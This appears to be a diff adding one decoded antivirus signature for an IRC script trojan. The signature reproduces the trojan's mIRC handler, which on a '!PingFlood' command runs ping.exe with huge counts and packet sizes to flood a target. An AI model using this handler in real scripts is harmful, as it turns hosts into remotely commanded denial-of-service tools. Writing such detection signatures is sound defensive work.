@@ -1,0 +1,5 @@
+VIRUS NAME: Win.Trojan.IRC_Script-137
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+:TEXT:!PingFlood *:*:{ /run -n ping.exe $2- -t -n 999999999 -l 15000 }
